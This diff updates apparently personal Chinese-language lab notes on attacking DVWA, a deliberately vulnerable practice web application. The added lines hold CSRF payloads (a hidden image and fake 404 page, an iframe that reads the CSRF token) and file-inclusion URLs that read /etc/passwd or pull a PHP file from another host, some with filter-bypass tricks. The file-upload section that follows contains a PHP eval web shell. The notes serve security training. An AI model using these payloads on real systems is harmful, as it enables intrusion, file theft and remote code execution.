@@ -48,12 +48,34 @@ Command Injection
 		command1 || command2   先执行command1，如果为假，再执行command2
 	
 CSRF
+	((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) :...	
 	http://1.117.162.201/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
+		<a href="">xiuxiu</a>
+		<img src="" border="0" style="display:none;"/><h1>404</h1><h2>页面没有找到</h2>
+		<script>window.location=""</script>
+	
+	if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {}
+		referer=http://1.117.162.201/dvwa/vulnerabilities/csrf/1.117.162.201
+	
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+		<iframe src="" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)></iframe>
+	
+	$pass_curr = $_GET[ 'password_current' ]; 
+	
 	
 File Inclusion
-	http://1.117.162.201/dvwa/vulnerabilities/fi/?page=/etc/passwd
-	http://1.117.162.201/dvwa/vulnerabilities/fi/?page=/var/www/html/phpinfo.php
-	
+	$file = $_GET[ 'page' ]; 
+		http://1.117.162.201/dvwa/vulnerabilities/fi/?page=/etc/passwd
+		http://1.117.162.201/dvwa/vulnerabilities/fi/?page=/var/www/html/phpinfo.php
+		http://1.117.162.201/dvwa/vulnerabilities/fi/?page=http://192.168.100.1/1.php	
+		http://1.117.162.201/dvwa/vulnerabilities/fi/?page=E://1.php
+	$file = str_replace( array( "../", "..\"" ), "", $file ); 
+		http://1.117.162.201/dvwa/vulnerabilities/fi/?page=//etc//passwd
+		http://1.117.162.201/dvwa/vulnerabilities/fi/?page=hthttptp://192.168.100.1/1.php
+	if( !fnmatch( "file*", $file ) && $file != "include.php" ) {}
+		http://1.117.162.201/dvwa/vulnerabilities/fi/?page=file:///E:1.php
+		
+	if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {}
 	
 File Upload
 	<?php @eval($_POST["password"]);?>
